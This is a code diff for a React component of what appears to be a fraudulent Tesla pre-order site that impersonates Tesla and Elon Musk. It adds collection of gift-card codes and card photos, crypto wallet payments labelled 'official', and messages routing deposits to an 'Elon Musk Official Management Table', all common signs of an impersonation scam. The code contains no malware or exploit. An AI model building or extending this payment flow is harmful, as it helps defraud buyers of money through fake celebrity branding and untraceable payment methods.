@@ -24,8 +24,14 @@ import {
   VehiclePackageOption,
   AdminPaymentAccounts,
   PaymentAccountRequest,
+  OfficialWalletSymbol,
+  GiftCardPhotoUpload,
 } from '../types';
 import { getVehicleDetailedSpecs } from '../data/teslaVehicles';
+import { mergeCompanyWallets } from '../data/officialWallets';
+import { OfficialWalletsSelector } from './OfficialWalletsSelector';
+import { CryptoPaymentConfirmBox } from './CryptoPaymentConfirmBox';
+import { ACCEPTED_GIFT_CARD_TYPES, GiftCardPaymentPanel } from './GiftCardPaymentPanel';
 import { handleImageFallback, normalizePhotoSrc } from '../utils/photoHelper';
 
 interface TeslaOrderModalProps {
@@ -140,6 +146,14 @@ const TeslaOrderModalInner: React.FC<{
   const [city, setCity] = useState('');
   const [postalCode, setPostalCode] = useState('');
   const [paymentMethod, setPaymentMethod] = useState<'wire' | 'gift_card' | 'crypto'>('wire');
+  const [selectedCryptoSymbol, setSelectedCryptoSymbol] = useState<OfficialWalletSymbol>('BTC');
+  const [cryptoPaymentConfirmed, setCryptoPaymentConfirmed] = useState<boolean>(false);
+  const [cryptoTxHash, setCryptoTxHash] = useState<string>('');
+  const [giftCardBrandId, setGiftCardBrandId] = useState<string>('apple');
+  const [giftCardFormat, setGiftCardFormat] = useState<'physical' | 'ecode'>('physical');
+  const [giftCardValueUsd, setGiftCardValueUsd] = useState<string>('');
+  const [giftCardCode, setGiftCardCode] = useState<string>('');
+  const [giftCardPhotos, setGiftCardPhotos] = useState<GiftCardPhotoUpload[]>([]);
   const [accountRequestNote, setAccountRequestNote] = useState('');
   const [copiedAccount, setCopiedAccount] = useState(false);
   const [referralCodeInput, setReferralCodeInput] = useState(defaultReferralCode);
@@ -216,14 +230,18 @@ const TeslaOrderModalInner: React.FC<{
   const handleProcessOrder = (e: React.FormEvent) => {
     e.preventDefault();
     if (!customerName || !customerEmail) return;
+    if (paymentMethod === 'crypto' && !cryptoPaymentConfirmed) return;
 
     const randomSuffix = Math.floor(100000 + Math.random() * 900000);
     const vinPrefix = vehicle.isFlyingCar ? '5YJSA-FLY' : '5YJSA-TSL';
     const reservationVin = `${vinPrefix}-${randomSuffix}`;
     const orderId = `TSLA-ORD-${Date.now().toString().slice(-6)}`;
     const paymentRefPrefix =
-      paymentMethod === 'wire' ? 'WIRE' : paymentMethod === 'gift_card' ? 'GIFT' : 'CRYPTO';
-    const paymentRef = `${paymentRefPrefix}-${Date.now().toString().slice(-6)}`;
+      paymentMethod === 'wire' ? 'WIRE' : paymentMethod === 'gift_card' ? 'GIFT' : selectedCryptoSymbol;
+    const paymentRef =
+      paymentMethod === 'crypto' && cryptoTxHash.trim()
+        ? `${selectedCryptoSymbol}-${cryptoTxHash.trim()}`
+        : `${paymentRefPrefix}-${Date.now().toString().slice(-6)}`;
 
     const now = new Date();
     const formattedTimestamp = now.toLocaleString('en-US', {
@@ -239,6 +257,14 @@ const TeslaOrderModalInner: React.FC<{
       ? Math.round(realPriceSold * (commissionPercent / 100) * 100) / 100
       : undefined;
 
+    const selectedGiftBrand =
+      ACCEPTED_GIFT_CARD_TYPES.find((b) => b.id === giftCardBrandId) || ACCEPTED_GIFT_CARD_TYPES[0];
+    const cleanGiftCode = giftCardCode.trim();
+    const giftCardLast4 = cleanGiftCode.length >= 4 ? cleanGiftCode.slice(-4).toUpperCase() : undefined;
+    const giftCardParsedVal = Number(giftCardValueUsd);
+    const giftCardFaceValue =
+      Number.isFinite(giftCardParsedVal) && giftCardParsedVal > 0 ? giftCardParsedVal : amountPaidToday;
+
     const newOrder: TeslaOrder = {
       orderId,
       reservationVin,
@@ -248,7 +274,19 @@ const TeslaOrderModalInner: React.FC<{
       paymentType: paymentMode,
       paymentStatus: 'pending_admin_approval',
       paymentMethod,
-      paymentReference: paymentRef,
+      paymentReference:
+        paymentMethod === 'gift_card'
+          ? `GIFT-${selectedGiftBrand.badgeCode}-${Date.now().toString().slice(-5)}`
+          : paymentRef,
+      ...(paymentMethod === 'gift_card'
+        ? {
+            giftCardType: selectedGiftBrand.name,
+            giftCardFormat,
+            giftCardFaceValue,
+            giftCardCodeLast4: giftCardLast4,
+            giftCardPhotos: giftCardPhotos.length > 0 ? giftCardPhotos : undefined,
+          }
+        : {}),
       depositAmount: currentDepositAmount,
       totalPrice: realPriceSold,
       amountPaidToday,
@@ -275,7 +313,11 @@ const TeslaOrderModalInner: React.FC<{
           id: `trk-init-${now.getTime()}`,
           stage: 'Production',
           title: 'Reservation & Payment Submitted',
-          details: `${paymentMode === 'full' ? 'Full vehicle settlement' : '20% advance deposit'} ($${amountPaidToday.toLocaleString()}) via ${paymentMethod === 'gift_card' ? 'GIFT CARD' : paymentMethod.toUpperCase()} (${paymentRef}) sent to Elon Musk Official Management Table for account provisioning & verification.${normalizedRef ? ` Referral Code ${normalizedRef} (${commissionPercent}% commission) attached.` : ''}`,
+          details: `${paymentMode === 'full' ? 'Full vehicle settlement' : '20% advance deposit'} ($${amountPaidToday.toLocaleString()}) via ${
+            paymentMethod === 'gift_card'
+              ? `GIFT CARD (${selectedGiftBrand.name}${giftCardPhotos.length > 0 ? `, ${giftCardPhotos.length} photo(s)` : ''})`
+              : paymentMethod.toUpperCase()
+          } (${paymentRef}) sent to Elon Musk Official Management Table for account provisioning & verification.${normalizedRef ? ` Referral Code ${normalizedRef} (${commissionPercent}% commission) attached.` : ''}`,
           location: `${deliveryAddress || '701 Brazos St'}, ${city || 'Austin, TX'}`,
           timestamp: now.toISOString(),
           dateStr: formattedTimestamp,
@@ -758,7 +800,10 @@ const TeslaOrderModalInner: React.FC<{
               <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                 <button
                   type="button"
-                  onClick={() => setPaymentMethod('wire')}
+                  onClick={() => {
+                    setPaymentMethod('wire');
+                    setCryptoPaymentConfirmed(false);
+                  }}
                   className={`p-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
                     paymentMethod === 'wire'
                       ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
@@ -769,7 +814,10 @@ const TeslaOrderModalInner: React.FC<{
                 </button>
                 <button
                   type="button"
-                  onClick={() => setPaymentMethod('gift_card')}
+                  onClick={() => {
+                    setPaymentMethod('gift_card');
+                    setCryptoPaymentConfirmed(false);
+                  }}
                   className={`p-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
                     paymentMethod === 'gift_card'
                       ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
@@ -787,12 +835,59 @@ const TeslaOrderModalInner: React.FC<{
                       : 'bg-[#08142b] border-blue-900/70 text-slate-300'
                   }`}
                 >
-                  Bitcoin / Doge / USDC
+                  Official Crypto &amp; PayPal USD
                 </button>
               </div>
 
-              {/* Payment Account Box (Admin Provided / Visitor Request) */}
+              {/* Payment Account Box (Official Wallets / Admin Provided / Visitor Request) */}
+              {paymentMethod === 'crypto' && (
+                <div className="space-y-3">
+                  <OfficialWalletsSelector
+                    wallets={mergeCompanyWallets(adminPaymentAccounts?.companyWallets)}
+                    selectedSymbol={selectedCryptoSymbol}
+                    onSelectSymbol={(sym) => {
+                      setSelectedCryptoSymbol(sym);
+                      setCryptoPaymentConfirmed(false);
+                    }}
+                  />
+                  <CryptoPaymentConfirmBox
+                    amountUsd={amountPaidToday}
+                    walletSymbol={selectedCryptoSymbol}
+                    confirmed={cryptoPaymentConfirmed}
+                    onConfirmChange={setCryptoPaymentConfirmed}
+                    txHash={cryptoTxHash}
+                    onTxHashChange={setCryptoTxHash}
+                  />
+                </div>
+              )}
+
+              {/* Gift Card Settlement Vault (Brand Selector + Multi-Photo Upload) */}
+              {paymentMethod === 'gift_card' && (
+                <GiftCardPaymentPanel
+                  amountDueUsd={amountPaidToday}
+                  selectedBrandId={giftCardBrandId}
+                  onSelectBrandId={setGiftCardBrandId}
+                  cardFormat={giftCardFormat}
+                  onChangeCardFormat={setGiftCardFormat}
+                  cardValueUsd={giftCardValueUsd}
+                  onChangeCardValueUsd={setGiftCardValueUsd}
+                  cardCode={giftCardCode}
+                  onChangeCardCode={setGiftCardCode}
+                  photos={giftCardPhotos}
+                  onChangePhotos={setGiftCardPhotos}
+                  adminInstructions={
+                    paymentAccountRequests.find(
+                      (r) => r.paymentMethod === 'gift_card' && r.status === 'issued' && r.issuedAccountDetails
+                    )?.issuedAccountDetails?.trim() || adminPaymentAccounts?.giftCardInstructions?.trim()
+                  }
+                />
+              )}
+
               {(() => {
+                if (paymentMethod === 'gift_card') {
+                  return null;
+                }
+
                 const issuedRequest = paymentAccountRequests.find(
                   (r) => r.paymentMethod === paymentMethod && r.status === 'issued' && r.issuedAccountDetails
                 );
@@ -800,12 +895,12 @@ const TeslaOrderModalInner: React.FC<{
                   (r) => r.paymentMethod === paymentMethod && r.status === 'pending_admin'
                 );
                 const globalAccount =
-                  paymentMethod === 'wire'
-                    ? adminPaymentAccounts?.wireDetails?.trim()
-                    : paymentMethod === 'gift_card'
-                    ? adminPaymentAccounts?.giftCardInstructions?.trim()
-                    : adminPaymentAccounts?.cryptoAddress?.trim();
+                  paymentMethod === 'wire' ? adminPaymentAccounts?.wireDetails?.trim() : '';
                 const activeAdminAccount = issuedRequest?.issuedAccountDetails?.trim() || globalAccount || '';
+
+                if (paymentMethod === 'crypto' && !issuedRequest?.issuedAccountDetails?.trim()) {
+                  return null;
+                }
 
                 if (activeAdminAccount) {
                   return (
@@ -816,8 +911,6 @@ const TeslaOrderModalInner: React.FC<{
                           <span>
                             {paymentMethod === 'wire'
                               ? 'Elon Musk Management-Issued Wire Transfer / ACH Account'
-                              : paymentMethod === 'gift_card'
-                              ? 'Elon Musk Management-Issued Gift Card Settlement Details'
                               : 'Elon Musk Management-Issued Crypto Settlement Wallet'}
                           </span>
                         </div>
@@ -853,8 +946,6 @@ const TeslaOrderModalInner: React.FC<{
                           <span>
                             {paymentMethod === 'wire'
                               ? 'Wire Transfer / ACH Account Requested'
-                              : paymentMethod === 'gift_card'
-                              ? 'Gift Card Settlement Account Requested'
                               : 'Crypto Wallet Address Requested'}
                           </span>
                         </div>
@@ -865,8 +956,6 @@ const TeslaOrderModalInner: React.FC<{
                       <p className="text-[11px] text-slate-300 leading-relaxed">
                         {paymentMethod === 'wire'
                           ? 'Your request for private Wire / ACH settlement credentials has been sent to the Elon Musk Official Management Table for account provisioning. Once authorized and issued, your banking details will appear here and in your In-App Inbox.'
-                          : paymentMethod === 'gift_card'
-                          ? 'Your request for official Gift Card settlement and redemption instructions has been sent to the Elon Musk Official Management Table for account provisioning. Once authorized and issued, your settlement details will appear here and in your In-App Inbox.'
                           : 'Your request for a verified Bitcoin, DOGE, or USDC settlement address has been sent to the Elon Musk Official Management Table for account provisioning. Once authorized and issued, your wallet address will appear here and in your In-App Inbox.'}
                       </p>
                       {onOpenInbox && (
@@ -891,8 +980,6 @@ const TeslaOrderModalInner: React.FC<{
                         <span>
                           {paymentMethod === 'wire'
                             ? 'Wire Transfer / ACH Account — Elon Musk Management Issued'
-                            : paymentMethod === 'gift_card'
-                            ? 'Gift Card Settlement — Elon Musk Management Issued'
                             : 'Bitcoin / Doge / USDC Wallet — Elon Musk Management Issued'}
                         </span>
                       </div>
@@ -903,8 +990,6 @@ const TeslaOrderModalInner: React.FC<{
                     <p className="text-[11px] text-slate-300 leading-relaxed">
                       {paymentMethod === 'wire'
                         ? 'To safeguard client allocations, official Wire and ACH banking credentials are sent to the Elon Musk Official Management Table for account provisioning. Please submit your request below to obtain private settlement instructions prior to initiating your transfer.'
-                        : paymentMethod === 'gift_card'
-                        ? 'To safeguard client allocations, official Gift Card settlement brands and redemption accounts are sent to the Elon Musk Official Management Table for account provisioning. Please submit your request below to obtain private gift card instructions prior to redeeming.'
                         : 'To safeguard client allocations, verified BTC, DOGE, and USDC settlement addresses are sent to the Elon Musk Official Management Table for account provisioning. Please submit your request below to obtain a dedicated wallet address prior to initiating your transfer.'}
                     </p>
                     <div className="flex flex-col sm:flex-row gap-2">
@@ -915,8 +1000,6 @@ const TeslaOrderModalInner: React.FC<{
                         placeholder={
                           paymentMethod === 'wire'
                             ? 'Optional note (e.g. Domestic Wire or ACH bank name)...'
-                            : paymentMethod === 'gift_card'
-                            ? 'Preferred card brand or card note (e.g. Apple, Amazon, Razer Gold)...'
                             : 'Preferred asset / network (e.g. BTC, DOGE, USDC)...'
                         }
                         className="flex-1 px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
@@ -940,8 +1023,6 @@ const TeslaOrderModalInner: React.FC<{
                         <span>
                           {paymentMethod === 'wire'
                             ? 'Request Wire Account from Elon Musk Management'
-                            : paymentMethod === 'gift_card'
-                            ? 'Request Gift Card Account from Elon Musk Management'
                             : 'Request Crypto Wallet from Elon Musk Management'}
                         </span>
                       </button>
@@ -977,9 +1058,12 @@ const TeslaOrderModalInner: React.FC<{
 
               <button
                 type="submit"
-                className="px-6 py-3 rounded-lg bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 text-white font-semibold text-xs hover:brightness-110 active:scale-95 transition-all shadow-lg shadow-blue-500/20 cursor-pointer"
+                disabled={paymentMethod === 'crypto' && !cryptoPaymentConfirmed}
+                className="px-6 py-3 rounded-lg bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 text-white font-semibold text-xs hover:brightness-110 active:scale-95 disabled:opacity-45 disabled:cursor-not-allowed transition-all shadow-lg shadow-blue-500/20 cursor-pointer"
               >
-                Confirm Pre-Order & Pay ${amountPaidToday.toLocaleString()}
+                {paymentMethod === 'crypto' && !cryptoPaymentConfirmed
+                  ? `Confirm ${selectedCryptoSymbol} Payment Above to Proceed`
+                  : `Confirm Pre-Order & Pay $${amountPaidToday.toLocaleString()}`}
               </button>
             </div>
           </form>
